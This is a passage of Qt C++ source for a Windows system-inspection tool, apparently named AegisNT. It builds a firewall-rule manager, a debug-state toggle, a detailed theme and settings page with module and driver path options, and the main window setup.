        QPointer<QWidget> SafePage(Page);
        std::thread([SafePage, Refresh, Status, Loading, DebugStateUi, Enable] {
            const bool Success = Enable ? EnableDebug() : DisableDebug();
            const DWORD ErrorCode = G_LastMultiDrvError;
            QMetaObject::invokeMethod(qApp, [SafePage, Refresh, Status, Loading, DebugStateUi, Enable, Success, ErrorCode] {
                if (!SafePage) return;
                Loading->stop();
                Loading->hide();
                Refresh->setEnabled(true);
                DebugStateUi->Enable->setEnabled(true);
                DebugStateUi->Disable->setEnabled(true);
                if (!Success) {
                    Status->setText(QString("%1 failed").arg(Enable ? "EnableDebug" : "DisableDebug"));
                    ShowErrorNotice(SafePage, "Kernel Inspector",
                        QString("%1 failed (error %2).").arg(Enable ? "EnableDebug" : "DisableDebug").arg(ErrorCode));
                } else {
                    ShowSuccessNotice(SafePage, "Kernel Inspector",
                        Enable ? "EnableDebug completed." : "DisableDebug completed.");
                    QTimer::singleShot(0, Refresh, &QPushButton::click);
                }
            }, Qt::QueuedConnection);
        }).detach();
    };
    QObject::connect(DebugStateUi->Enable, &QPushButton::clicked, Page, [RunDebugAction] { RunDebugAction(true); });
    QObject::connect(DebugStateUi->Disable, &QPushButton::clicked, Page, [RunDebugAction] { RunDebugAction(false); });
    QObject::connect(FwAddBtn, &QPushButton::clicked, Page, [Page, Refresh] {
        auto *Dialog = new MessageBoxBase(Page->window());
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        auto *NameEdit = new LineEdit;
        NameEdit->setPlaceholderText("Rule name");
        auto *ActionCombo = new ComboBox;
        ActionCombo->addItems({"Block", "Allow"});
        auto *ProtocolCombo = new ComboBox;
        ProtocolCombo->addItems({"TCP", "UDP"});
        auto *PortEdit = new LineEdit;
        PortEdit->setPlaceholderText("Local port");
        Dialog->viewLayout()->addWidget(MakeLabel("Add firewall rule", 18, KTextPrimary, QFont::DemiBold));
        Dialog->viewLayout()->addWidget(NameEdit);
        Dialog->viewLayout()->addWidget(ActionCombo);
        Dialog->viewLayout()->addWidget(ProtocolCombo);
        Dialog->viewLayout()->addWidget(PortEdit);
        Dialog->yesButton()->setText("Add");
        QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog, [Page, Dialog, NameEdit, ActionCombo, ProtocolCombo, PortEdit, Refresh] {
            const QString Name = NameEdit->text().trimmed();
            bool Ok = false;
            const ULONG Port = PortEdit->text().trimmed().toULong(&Ok);
            if (Name.isEmpty() || !Ok || Port == 0 || Port > 65535)
            {
                ShowWarningNotice(Page, "Kernel Inspector", "Enter a valid rule name and port.");
                return;
            }
            const bool Success = AddFirewallRuleFallback(Name, ActionCombo->currentIndex() == 0 ? 0u : 1u,
                ProtocolCombo->currentIndex() == 0 ? 6u : 17u, Port);
            if (!Success)
            {
                ShowErrorNotice(Page, "Kernel Inspector", "Unable to add firewall rule.");
                return;
            }
            Dialog->accept();
            ShowSuccessNotice(Page, "Kernel Inspector", "Firewall rule added.");
            QTimer::singleShot(0, Refresh, &QPushButton::click);
        });
        QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject);
        Dialog->show();
    });
    QObject::connect(FwTable, &QWidget::customContextMenuRequested, Page, [Page, FwTable, Refresh](const QPoint &Position) {
        const QModelIndex Index = FwTable->indexAt(Position);
        if (!Index.isValid())
            return;
        FwTable->selectRow(Index.row());
        QTableWidgetItem *NameItem = FwTable->item(Index.row(), 0);
        QTableWidgetItem *StateItem = FwTable->item(Index.row(), 4);
        if (!NameItem || !StateItem)
            return;
        const QString RuleName = NameItem->text().trimmed();
        const bool Enabled = StateItem->text().contains("Enabled", Qt::CaseInsensitive);
        auto *Menu = new RoundMenu(QString(), Page);
        auto *ToggleAction = new QAction(Enabled ? "Disable rule" : "Enable rule", Menu);
        auto *DeleteAction = new QAction("Delete rule", Menu);
        auto *RefreshAction = new QAction("Refresh", Menu);
        Menu->addAction(ToggleAction);
        Menu->addAction(DeleteAction);
        Menu->addAction(RefreshAction);
        ConnectMenuAction(ToggleAction, Page, [Page, RuleName, Enabled, Refresh] {
            if (!SetFirewallRuleEnabledFallback(RuleName, !Enabled))
            {
                ShowErrorNotice(Page, "Kernel Inspector", QString("Unable to %1 firewall rule.").arg(Enabled ? "disable" : "enable"));
                return;
            }
            ShowSuccessNotice(Page, "Kernel Inspector", QString("Firewall rule %1.").arg(Enabled ? "disabled" : "enabled"));
            QTimer::singleShot(0, Refresh, &QPushButton::click);
        });
        ConnectMenuAction(DeleteAction, Page, [Page, RuleName, Refresh] {
            if (!RemoveFirewallRuleFallback(RuleName))
            {
                ShowErrorNotice(Page, "Kernel Inspector", "Unable to delete firewall rule.");
                return;
            }
            ShowSuccessNotice(Page, "Kernel Inspector", "Firewall rule deleted.");
            QTimer::singleShot(0, Refresh, &QPushButton::click);
        });
        ConnectMenuAction(RefreshAction, Page, [Refresh] { QTimer::singleShot(0, Refresh, &QPushButton::click); });
        ReleaseMenuAfterClose(Menu);
        Menu->exec(FwTable->viewport()->mapToGlobal(Position));
    });
    QTimer::singleShot(0, Refresh, &QPushButton::click);
    return Page;
}

QWidget *CreateSettingsPage()
{
    auto *Content = new QWidget;
    Content->setObjectName("SettingsContent");
    auto *Layout = new QVBoxLayout(Content);
    Layout->setContentsMargins(0, 0, 0, 0);
    Layout->setSpacing(12);
    const auto ThemeUiSyncing = std::make_shared<bool>(false);

    const auto AddSection = [Layout](const QString &Title) {
        auto *Label = MakeLabel(Title, 15, KAccent, QFont::DemiBold);
        Label->setContentsMargins(2, 10, 0, 2);
        Layout->addWidget(Label);
    };

    const auto AddSetting = [Layout](const QString &Title, const QString &Description, QWidget *Control) {
        auto *Row = new QFrame;
        Row->setObjectName("settingRow");
        Row->setMinimumHeight(72);
        auto *RowLayout = new QHBoxLayout(Row);
        RowLayout->setContentsMargins(18, 10, 18, 10);
        auto *TextLayout = new QVBoxLayout;
        TextLayout->setSpacing(3);
        TextLayout->addWidget(MakeLabel(Title, 10, KTextPrimary, QFont::DemiBold));
        TextLayout->addWidget(MakeLabel(Description, 9, KTextMuted));
        RowLayout->addLayout(TextLayout, 1);
        RowLayout->addWidget(Control);
        Layout->addWidget(Row);
    };

    AddSection("Theme");

    auto *DarkMode = new SwitchButton;
    DarkMode->setChecked(ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool());
    AddSetting("Dark mode", "Switch between the light and dark QFluent themes.", DarkMode);
    QObject::connect(DarkMode, &SwitchButton::checkedChanged, Content, [Content, ThemeUiSyncing](bool Checked) {
        if (*ThemeUiSyncing)
            return;
        SetConfigurationValueTransient("Theme", "DarkMode", Checked);
        QueueThemeApply(Content->window(), true, true);
    });

    auto *BackgroundMaterial = new ComboBox;
    BackgroundMaterial->addItems({"Off", "Mica", "Acrylic"});
    BackgroundMaterial->setCurrentIndex(std::clamp(
        ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt(), 0, 2));
    BackgroundMaterial->setMinimumWidth(154);
    AddSetting("Background material", "Use the Windows Mica or Acrylic backdrop behind the theme.",
               BackgroundMaterial);
    QObject::connect(BackgroundMaterial, &ComboBox::currentIndexChanged, Content,
                     [Content, ThemeUiSyncing](int Index) {
        if (*ThemeUiSyncing)
            return;
        SetConfigurationValueTransient("Theme", "BackgroundMaterial", Index);
        QueueThemeApply(Content->window(), true, true);
    });

    auto *WallpaperControl = new QWidget;
    auto *WallpaperLayout = new QHBoxLayout(WallpaperControl);
    WallpaperLayout->setContentsMargins(0, 0, 0, 0);
    auto *WallpaperPath = new LineEdit;
    WallpaperPath->setReadOnly(true);
    WallpaperPath->setMinimumWidth(280);
    WallpaperPath->setPlaceholderText("No wallpaper selected");
    WallpaperPath->setText(ConfigurationValue("Theme", "WallpaperPath", "").toString());
    auto *SelectWallpaper = new PushButton("Browse", Fluent::IconType::FOLDER);
    auto *ClearWallpaper = MakeButton("Clear");
    ClearWallpaper->setEnabled(!WallpaperPath->text().isEmpty());
    WallpaperLayout->addWidget(WallpaperPath, 1);
    WallpaperLayout->addWidget(SelectWallpaper);
    WallpaperLayout->addWidget(ClearWallpaper);
    AddSetting("Wallpaper", "Display a local image behind the window background and large panel layers.", WallpaperControl);
    QObject::connect(SelectWallpaper, &QPushButton::clicked, Content,
                     [Content, WallpaperPath, ClearWallpaper] {
        const QString Path = QFileDialog::getOpenFileName(
            Content->window(), "Select wallpaper", WallpaperPath->text(),
            "Images (*.png *.jpg *.jpeg *.bmp *.webp);;All files (*.*)");
        if (Path.isEmpty())
            return;
        const QString AbsolutePath = QDir::toNativeSeparators(QFileInfo(Path).absoluteFilePath());
        SetConfigurationValueTransient("Theme", "WallpaperPath", AbsolutePath);
        WallpaperPath->setText(AbsolutePath);
        ClearWallpaper->setEnabled(true);
        QueueThemeApply(Content->window(), true, true);
    });
    QObject::connect(ClearWallpaper, &QPushButton::clicked, Content,
                     [Content, WallpaperPath, ClearWallpaper] {
        SetConfigurationValueTransient("Theme", "WallpaperPath", "");
        WallpaperPath->clear();
        ClearWallpaper->setEnabled(false);
        QueueThemeApply(Content->window(), true, true);
    });

    auto *WallpaperMode = new ComboBox;
    WallpaperMode->addItems({"Fill", "Fit", "Stretch", "Tile"});
    WallpaperMode->setCurrentIndex(std::clamp(ConfigurationValue("Theme", "WallpaperMode", 0).toInt(), 0, 3));
    WallpaperMode->setMinimumWidth(154);
    AddSetting("Wallpaper mode", "Choose how the image is fitted to the application window.", WallpaperMode);
    QObject::connect(WallpaperMode, &ComboBox::currentIndexChanged, Content, [Content, ThemeUiSyncing](int Index) {
        if (*ThemeUiSyncing)
            return;
        SetConfigurationValueTransient("Theme", "WallpaperMode", Index);
        QueueThemeApply(Content->window(), true, true);
    });

    const auto UpdateColorButton = [](PushButton *Button, const QColor &Color) {
        QPixmap Swatch(16, 16);
        Swatch.fill(Color);
        Button->setIcon(QIcon(Swatch));
        Button->setIconSize(QSize(16, 16));
        Button->setText(Color.name(QColor::HexRgb).toUpper());
    };
    const auto ResolveThemeColor = [](const QString &Key) -> QColor {
        const ThemePalette Palette = CurrentThemePalette();
        if (Key == "AccentColor") return Palette.Accent;
        if (Key == "AccentHoverColor") return Palette.AccentHover;
        if (Key == "AccentPressedColor") return Palette.AccentPressed;
        if (Key == "PageBackgroundColor") return Palette.PageBackground;
        if (Key == "CardSurfaceColor") return Palette.CardSurface;
        if (Key == "SurfaceElevatedColor") return Palette.ElevatedSurface;
        if (Key == "SurfaceSunkenColor") return Palette.SunkenSurface;
        if (Key == "InputSurfaceColor") return Palette.InputSurface;
        if (Key == "TableSurfaceColor") return Palette.TableSurface;
        if (Key == "PopupSurfaceColor") return Palette.PopupSurface;
        if (Key == "BorderColor") return Palette.Border;
        if (Key == "DividerColor") return Palette.Divider;
        if (Key == "TextColor") return Palette.Text;
        if (Key == "MutedTextColor") return Palette.MutedText;
        if (Key == "SelectionTextColor") return Palette.SelectionText;
        if (Key == "DangerColor") return Palette.Danger;
        if (Key == "WarningColor") return Palette.Warning;
        if (Key == "SuccessColor") return Palette.Success;
        return QColor();
    };
    QMap<QString, PushButton *> ThemeColorButtons;
    const auto AddColorSetting = [AddSetting, Content, UpdateColorButton, ThemeUiSyncing](const QString &Title, const QString &Description,
                                                                                           const QString &Key, const QColor &Fallback) {
        const QColor CurrentColor = ConfiguredColor(Key, Fallback);
        auto *ColorButton = new PushButton(CurrentColor.name(QColor::HexRgb).toUpper());
        ColorButton->setMinimumWidth(154);
        ColorButton->setMinimumHeight(36);
        ColorButton->setStyleSheet("PushButton { padding-left: 12px; padding-right: 14px; }");
        UpdateColorButton(ColorButton, CurrentColor);
        AddSetting(Title, Description, ColorButton);
        QObject::connect(ColorButton, &QPushButton::clicked, Content, [Content, ColorButton, UpdateColorButton, Key, Fallback, Title, ThemeUiSyncing] {
            if (*ThemeUiSyncing)
                return;
            const QColor Selected = QColorDialog::getColor(ConfiguredColor(Key, Fallback), Content->window(),
                                                           "Select " + Key, QColorDialog::ShowAlphaChannel);
            if (!Selected.isValid())
                return;
            SetConfigurationValueTransient("Theme", Key, Selected.name(QColor::HexRgb).toUpper());
            UpdateColorButton(ColorButton, Selected);
            QueueThemeApply(Content->window(), true, true);
        });
        return ColorButton;
    };

    AddSection("Theme preview");
    auto *PreviewCard = new QFrame;
    PreviewCard->setObjectName("ThemePreviewCard");
    auto *PreviewLayout = new QVBoxLayout(PreviewCard);
    PreviewLayout->setContentsMargins(16, 16, 16, 16);
    PreviewLayout->setSpacing(12);
    auto *PreviewNav = new QFrame;
    PreviewNav->setObjectName("ThemePreviewNavItem");
    auto *PreviewNavLayout = new QHBoxLayout(PreviewNav);
    PreviewNavLayout->setContentsMargins(12, 8, 12, 8);
    PreviewNavLayout->addWidget(MakeLabel("Navigation item", 11, KTextPrimary, QFont::DemiBold));
    PreviewNavLayout->addStretch();
    PreviewNavLayout->addWidget(MakeLabel("Active", 10, KTextMuted));
    PreviewLayout->addWidget(PreviewNav);
    auto *PreviewRow = new QFrame;
    PreviewRow->setObjectName("ThemePreviewTableRow");
    auto *PreviewRowLayout = new QHBoxLayout(PreviewRow);
    PreviewRowLayout->setContentsMargins(12, 8, 12, 8);
    PreviewRowLayout->addWidget(MakeLabel("Table row / entry", 10, KTextPrimary, QFont::Normal), 1);
    auto *Good = new QFrame; Good->setObjectName("ThemePreviewStatusGood"); Good->setFixedSize(44, 24);
    auto *Warn = new QFrame; Warn->setObjectName("ThemePreviewStatusWarn"); Warn->setFixedSize(44, 24);
    auto *Danger = new QFrame; Danger->setObjectName("ThemePreviewStatusDanger"); Danger->setFixedSize(44, 24);
    PreviewRowLayout->addWidget(Good);
    PreviewRowLayout->addWidget(Warn);
    PreviewRowLayout->addWidget(Danger);
    PreviewLayout->addWidget(PreviewRow);
    auto *PreviewControls = new QHBoxLayout;
    PreviewControls->setContentsMargins(0, 0, 0, 0);
    PreviewControls->setSpacing(8);
    auto *PreviewInput = new LineEdit;
    PreviewInput->setPlaceholderText("Input field");
    auto *PreviewButton = MakeButton("Primary", true);
    auto *PreviewGhost = MakeButton("Secondary");
    PreviewControls->addWidget(PreviewInput, 1);
    PreviewControls->addWidget(PreviewGhost);
    PreviewControls->addWidget(PreviewButton);
    PreviewLayout->addLayout(PreviewControls);
    Layout->addWidget(PreviewCard);

    const auto RegisterColorSetting = [&](const QString &Title, const QString &Description,
                                          const QString &Key, const QColor &Fallback) -> PushButton * {
        PushButton *Button = AddColorSetting(Title, Description, Key, Fallback);
        ThemeColorButtons.insert(Key, Button);
        return Button;
    };
    const auto SyncThemeColorButtons = [&ThemeColorButtons, UpdateColorButton, ResolveThemeColor] {
        for (auto It = ThemeColorButtons.begin(); It != ThemeColorButtons.end(); ++It)
            UpdateColorButton(It.value(), ResolveThemeColor(It.key()));
    };

    AddSection("Brand colors");
    auto *AccentColor = RegisterColorSetting("Accent", "Primary brand color for selected navigation and main actions.",
                                             "AccentColor", ResolveThemeColor("AccentColor"));
    auto *AccentHoverColor = RegisterColorSetting("Accent hover", "Hover state for primary interactive elements.",
                                                  "AccentHoverColor", ResolveThemeColor("AccentHoverColor"));
    auto *AccentPressedColor = RegisterColorSetting("Accent pressed", "Pressed state for primary interactive elements.",
                                                    "AccentPressedColor", ResolveThemeColor("AccentPressedColor"));

    AddSection("Background layers");
    auto *PageBackgroundColor = RegisterColorSetting("Page background", "Window content background under panels.",
                                                     "PageBackgroundColor", ResolveThemeColor("PageBackgroundColor"));
    auto *CardSurfaceColor = RegisterColorSetting("Card background", "Primary card and panel surface.",
                                                  "CardSurfaceColor", ResolveThemeColor("CardSurfaceColor"));
    auto *ElevatedSurfaceColor = RegisterColorSetting("Elevated surface", "Dialogs, previews, and higher-level panels.",
                                                      "SurfaceElevatedColor", ResolveThemeColor("SurfaceElevatedColor"));
    auto *SunkenSurfaceColor = RegisterColorSetting("Sunken surface", "Header, separators, and recessed layers.",
                                                    "SurfaceSunkenColor", ResolveThemeColor("SurfaceSunkenColor"));
    auto *InputSurfaceColor = RegisterColorSetting("Input background", "Line edit, combo, and editor backgrounds.",
                                                   "InputSurfaceColor", ResolveThemeColor("InputSurfaceColor"));
    auto *TableSurfaceColor = RegisterColorSetting("Table background", "List and table rows without wallpaper bleed.",
                                                   "TableSurfaceColor", ResolveThemeColor("TableSurfaceColor"));
    auto *PopupSurfaceColor = RegisterColorSetting("Popup background", "Menu, preview, and floating surface background.",
                                                   "PopupSurfaceColor", ResolveThemeColor("PopupSurfaceColor"));
    auto *BorderColor = RegisterColorSetting("Border", "Primary outline for cards and controls.",
                                             "BorderColor", ResolveThemeColor("BorderColor"));
    auto *DividerColor = RegisterColorSetting("Divider", "Subtle separators and table grid lines.",
                                              "DividerColor", ResolveThemeColor("DividerColor"));

    AddSection("Text layers");
    auto *TextColor = RegisterColorSetting("Primary text", "Main labels, values, and control text.",
                                           "TextColor", ResolveThemeColor("TextColor"));
    auto *MutedColor = RegisterColorSetting("Secondary text", "Descriptions, status text, and placeholders.",
                                            "MutedTextColor", ResolveThemeColor("MutedTextColor"));
    auto *SelectionTextColor = RegisterColorSetting("Selected text", "Text color shown over accent selections.",
                                                    "SelectionTextColor", ResolveThemeColor("SelectionTextColor"));

    AddSection("Feedback colors");
    auto *DangerColor = RegisterColorSetting("Danger", "Destructive operations and alert states.",
                                             "DangerColor", ResolveThemeColor("DangerColor"));
    auto *WarningColor = RegisterColorSetting("Warning", "Caution states and degraded status.",
                                              "WarningColor", ResolveThemeColor("WarningColor"));
    auto *SuccessColor = RegisterColorSetting("Success", "Healthy state and successful actions.",
                                              "SuccessColor", ResolveThemeColor("SuccessColor"));
    const auto AddThemeSlider = [AddSetting, Content, ThemeUiSyncing](const QString &Title, const QString &Description,
                                                                      const QString &Key, int Minimum, int Maximum,
                                                                      int DefaultValue, const QString &Suffix) {
        auto *Control = new QWidget;
        auto *ControlLayout = new QHBoxLayout(Control);
        ControlLayout->setContentsMargins(0, 0, 0, 0);
        auto *ValueSlider = new Slider(Qt::Horizontal);
        ValueSlider->setRange(Minimum, Maximum);
        ValueSlider->setValue(std::clamp(ConfigurationValue("Theme", Key, DefaultValue).toInt(), Minimum, Maximum));
        ValueSlider->setMinimumWidth(220);
        auto *ValueLabel = new StrongBodyLabel(QString::number(ValueSlider->value()) + Suffix);
        ValueLabel->setMinimumWidth(58);
        ValueLabel->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
        ControlLayout->addWidget(ValueSlider);
        ControlLayout->addWidget(ValueLabel);
        AddSetting(Title, Description, Control);
        auto *PreviewTimer = new QTimer(ValueSlider);
        PreviewTimer->setSingleShot(true);
        PreviewTimer->setInterval(60);
        auto *SaveTimer = new QTimer(ValueSlider);
        SaveTimer->setSingleShot(true);
        SaveTimer->setInterval(250);
        QObject::connect(PreviewTimer, &QTimer::timeout, Content,
                         [Content, ThemeUiSyncing] {
            if (*ThemeUiSyncing)
                return;
            QueueThemeApply(Content->window(), false, true);
        });
        QObject::connect(SaveTimer, &QTimer::timeout, Content, [] { SaveConfiguration(); });
        QObject::connect(ValueSlider, &QSlider::valueChanged, Content,
                         [ValueLabel, Key, Suffix, PreviewTimer, SaveTimer, ThemeUiSyncing](int Value) {
            ValueLabel->setText(QString::number(Value) + Suffix);
            if (*ThemeUiSyncing)
                return;
            SetConfigurationValueTransient("Theme", Key, Value);
            PreviewTimer->start();
            SaveTimer->start();
        });
        return ValueSlider;
    };

    auto *CornerRadius = AddThemeSlider("Corner radius", "Roundness of panels and setting rows.",
                                        "CornerRadius", 0, 12, KDefaultThemeCornerRadius, " px");
    auto *FontScale = AddThemeSlider("Font scale", "Scale application text without changing window dimensions.",
                                     "FontScale", 85, 125, KDefaultThemeFontScale, "%");
    auto *Density = AddThemeSlider("Interface density", "Adjust menu and table header spacing.",
                                   "Density", 80, 120, KDefaultThemeDensity, "%");
    auto *WallpaperOpacity = AddThemeSlider("Wallpaper opacity", "Control wallpaper visibility behind panels and content.",
                                            "WallpaperOpacity", 5, 100, KDefaultThemeWallpaperOpacity, "%");

    auto *ResetTheme = new PushButton("Restore default theme", Fluent::IconType::RETURN);
    AddSetting("Restore defaults", "Reset theme mode and all custom colors.", ResetTheme);
    QObject::connect(ResetTheme, &QPushButton::clicked, Content,
                     [Content, DarkMode, BackgroundMaterial, WallpaperPath, ClearWallpaper, WallpaperMode,
                      CornerRadius, FontScale, Density, WallpaperOpacity, SyncThemeColorButtons, ThemeUiSyncing] {
        QJsonObject ThemeObject = ConfigurationSection("Theme");
        ApplyDefaultThemeValues(ThemeObject);
        ThemeObject.insert("WallpaperPath", "");
        ThemeObject.insert("WallpaperMode", 0);
        Configuration.insert("Theme", ThemeObject);
        *ThemeUiSyncing = true;
        const QSignalBlocker BlockDarkMode(DarkMode);
        const QSignalBlocker BlockBackgroundMaterial(BackgroundMaterial);
        const QSignalBlocker BlockWallpaperMode(WallpaperMode);
        const QSignalBlocker BlockCornerRadius(CornerRadius);
        const QSignalBlocker BlockFontScale(FontScale);
        const QSignalBlocker BlockDensity(Density);
        const QSignalBlocker BlockWallpaperOpacity(WallpaperOpacity);
        DarkMode->setChecked(ConfigurationValue("Theme", "DarkMode", KDefaultThemeDarkMode).toBool());
        BackgroundMaterial->setCurrentIndex(ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt());
        WallpaperPath->clear();
        ClearWallpaper->setEnabled(false);
        WallpaperMode->setCurrentIndex(0);
        SyncThemeColorButtons();
        CornerRadius->setValue(ConfigurationValue("Theme", "CornerRadius", KDefaultThemeCornerRadius).toInt());
        FontScale->setValue(ConfigurationValue("Theme", "FontScale", KDefaultThemeFontScale).toInt());
        Density->setValue(ConfigurationValue("Theme", "Density", KDefaultThemeDensity).toInt());
        WallpaperOpacity->setValue(ConfigurationValue("Theme", "WallpaperOpacity", KDefaultThemeWallpaperOpacity).toInt());
        *ThemeUiSyncing = false;
        QueueThemeApply(Content->window(), true, true);
    });

    AddSection("Module paths");

    auto *ModulePath = new BodyLabel(ConfigurationPaths("Modules", "./Modules").join("; "));
    ModulePath->setMinimumWidth(260);
    ModulePath->setWordWrap(true);
    auto *BrowseModules = new PushButton("Browse", Fluent::IconType::FOLDER);
    auto *ModulePathControl = new QWidget;
    auto *ModulePathLayout = new QHBoxLayout(ModulePathControl);
    ModulePathLayout->setContentsMargins(0, 0, 0, 0);
    ModulePathLayout->addWidget(ModulePath, 1);
    ModulePathLayout->addWidget(BrowseModules);
    AddSetting("Modules", "Select the DLL module directory.", ModulePathControl);
    QObject::connect(BrowseModules, &QPushButton::clicked, Content, [Content, ModulePath] {
        const QString Directory = QFileDialog::getExistingDirectory(Content->window(), "Select module directory",
                                                                    ConfigurationPaths("Modules", "./Modules").first());
        if (Directory.isEmpty())
            return;
        SetConfigurationPath("Modules", QDir::toNativeSeparators(Directory));
        ModulePath->setText(QDir::toNativeSeparators(Directory));
        ShowSuccessNotice(Content, "Settings", "Module path updated.");
    });

    auto *ModuleAutoLoad = new SwitchButton;
    ModuleAutoLoad->setChecked(ConfigurationValue("Modules", "AutoLoad", true).toBool());
    AddSetting("Load modules after scan", "Automatically enable discovered DLL modules.", ModuleAutoLoad);
    QObject::connect(ModuleAutoLoad, &SwitchButton::checkedChanged, Content,
                     [Content](bool Checked) { SetConfigurationValue("Modules", "AutoLoad", Checked); ShowSuccessNotice(Content, "Settings", Checked ? "Module auto-load enabled." : "Module auto-load disabled."); });

    auto *DriverPath = new BodyLabel(ConfigurationPaths("Drivers", "./Drivers").join("; "));
    DriverPath->setMinimumWidth(260);
    DriverPath->setWordWrap(true);
    auto *BrowseDrivers = new PushButton("Browse", Fluent::IconType::FOLDER);
    auto *DriverPathControl = new QWidget;
    auto *DriverPathLayout = new QHBoxLayout(DriverPathControl);
    DriverPathLayout->setContentsMargins(0, 0, 0, 0);
    DriverPathLayout->addWidget(DriverPath, 1);
    DriverPathLayout->addWidget(BrowseDrivers);
    AddSetting("Drivers", "Select the kernel driver directory.", DriverPathControl);
    QObject::connect(BrowseDrivers, &QPushButton::clicked, Content, [Content, DriverPath] {
        const QString Directory = QFileDialog::getExistingDirectory(Content->window(), "Select driver directory",
                                                                    ConfigurationPaths("Drivers", "./Drivers").first());
        if (Directory.isEmpty())
            return;
        SetConfigurationPath("Drivers", QDir::toNativeSeparators(Directory));
        DriverPath->setText(QDir::toNativeSeparators(Directory));
        ShowSuccessNotice(Content, "Settings", "Driver path updated.");
    });

    auto *DriverAutoLoad = new SwitchButton;
    DriverAutoLoad->setChecked(ConfigurationValue("Drivers", "AutoLoad", true).toBool());
    AddSetting("Load drivers after scan", "Automatically enable discovered kernel drivers.", DriverAutoLoad);
    QObject::connect(DriverAutoLoad, &SwitchButton::checkedChanged, Content,
                     [Content](bool Checked) { SetConfigurationValue("Drivers", "AutoLoad", Checked); ShowSuccessNotice(Content, "Settings", Checked ? "Driver auto-load enabled." : "Driver auto-load disabled."); });

    AddSection("Application");

    const int Width = ConfigurationValue("Application", "Width", 1600).toInt();
    const int Height = ConfigurationValue("Application", "Height", 1000).toInt();
    const int Fps = qRound(ConfigurationValue("Application", "FPS", 90.0).toDouble());
    AddSetting("Window size", "Configured startup dimensions.",
               new StrongBodyLabel(QString("%1 x %2").arg(Width).arg(Height)));
    AddSetting("Frame rate", "Configured rendering frame rate.", new StrongBodyLabel(QString::number(Fps) + " FPS"));

    auto *OpacityControl = new QWidget;
    auto *OpacityLayout = new QHBoxLayout(OpacityControl);
    OpacityLayout->setContentsMargins(0, 0, 0, 0);
    auto *Opacity = new Slider(Qt::Horizontal);
    Opacity->setRange(35, 100);
    Opacity->setValue(qRound(ConfigurationValue("Application", "Opacity", 1.0).toDouble() * 100.0));
    Opacity->setMinimumWidth(220);
    auto *OpacityValue = new StrongBodyLabel(QString::number(Opacity->value()) + "%");
    OpacityValue->setMinimumWidth(48);
    OpacityValue->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
    OpacityLayout->addWidget(Opacity);
    OpacityLayout->addWidget(OpacityValue);
    AddSetting("Window opacity", "Adjust the current window transparency from 35% to 100%.", OpacityControl);
    auto *OpacitySaveTimer = new QTimer(Opacity);
    OpacitySaveTimer->setSingleShot(true);
    OpacitySaveTimer->setInterval(250);
    QObject::connect(OpacitySaveTimer, &QTimer::timeout, Content, [] { SaveConfiguration(); });
    QObject::connect(Opacity, &QSlider::valueChanged, Content, [Content, OpacityValue, OpacitySaveTimer](int Value) {
        OpacityValue->setText(QString::number(Value) + "%");
        SetConfigurationValueTransient("Application", "Opacity", Value / 100.0);
        Content->window()->setWindowOpacity(Value / 100.0);
        OpacitySaveTimer->start();
    });

    AddSection("About");
    AddSetting("Version", "Current AegisNT release.",
               new StrongBodyLabel(ConfigurationValue("Application", "Version", "1.0.0").toString()));
    AddSetting("Author", "Application author.", new StrongBodyLabel("RegistryEdit"));

    Layout->addStretch();
    auto *Scroll = new ScrollArea;
    InstallFluentScrollBar(Scroll, Qt::Vertical);
    Scroll->setObjectName("SettingsScroll");
    Scroll->setWidgetResizable(true);
    Scroll->setFrameShape(QFrame::NoFrame);
    Scroll->viewport()->setAutoFillBackground(false);
    Scroll->setWidget(Content);
    return WrapPage(Scroll);
}

QWidget *CreatePageBody(int Index)
{
    switch (Index)
    {
    case 0:
        return CreateInformationPage();
    case 1:
        return CreateTaskPage();
    case 2:
        return CreateMonitorPage();
    case 3:
        return CreateRegistryPage();
    case 4:
        return CreateFilePage();
    case 5:
        return CreateWindowPage();
    case 6:
        return CreateDriverPage();
    case 7:
        return CreateMemoryPage();
    case 8:
        return CreateTablePage();
    case 9:
        return CreateCallbackPage();
    case 10:
        return CreatePayloadPage();
    case 11:
        return CreateModuleRunPage();
    case 12:
        return CreateModuleManagerPage();
    case 13:
        return CreateConsolePage();
    case 14:
        return CreateSettingsPage();
    case 15:
        return CreateKernelInspectorPage();
    case 16:
        return CreateServiceManagerPage();
    default:
        return new QWidget;
    }
}

class WindowsToolWindow final : public QWidget
{
  public:
    WindowsToolWindow()
    {
        setAttribute(Qt::WA_DontCreateNativeAncestors);
        WindowAgent = new QWK::WidgetWindowAgent(this);
        WindowAgent->setup(this);
        setWindowTitle("AegisNT");
        setMinimumSize(900, 620);
        const QIcon Icon = ApplicationIcon();
        if (!Icon.isNull())
            qApp->setWindowIcon(Icon);
        setWindowIcon(Icon.isNull() ? style()->standardIcon(QStyle::SP_ComputerIcon) : Icon);

        auto *Root = new QVBoxLayout(this);
        Root->setContentsMargins(0, 0, 0, 0);
        Root->setSpacing(0);
        Root->addWidget(CreateTitleBar());
        auto *Body = new QWidget;
        Body->setObjectName("WindowBody");
        auto *BodyLayout = new QHBoxLayout(Body);
        BodyLayout->setContentsMargins(0, 0, 0, 0);
        BodyLayout->setSpacing(0);
        BodyLayout->addWidget(CreateSidebar());
        BodyLayout->addWidget(CreateContent(), 1);
        Root->addWidget(Body, 1);

        ApplyStyleSheet();
        ApplyConfiguredAppearance(this);
        QTimer::singleShot(0, this, [this] {
            SelectPage(0, false);
            PageStack->setAnimationEnabled(true);
            if (!ModulesScanned &&
                (ConfigurationValue("Drivers", "AutoLoad", true).toBool() ||
                 ConfigurationValue("Modules", "AutoLoad", true).toBool()))
                ScanRuntimeModules();
        });
    }

  protected:
    void showEvent(QShowEvent *Event) override
    {
        QWidget::showEvent(Event);
        ScheduleBackdropRefresh(this);
    }

    void paintEvent(QPaintEvent *Event) override
    {
        QWidget::paintEvent(Event);
        const QString WallpaperPath = ConfigurationValue("Theme", "WallpaperPath", "").toString();
        if (WallpaperPath.isEmpty())
            return;
        const int WallpaperMode = std::clamp(ConfigurationValue("Theme", "WallpaperMode", 0).toInt(), 0, 3);
        if (CachedWallpaperPath != WallpaperPath || CachedWallpaperMode != WallpaperMode ||
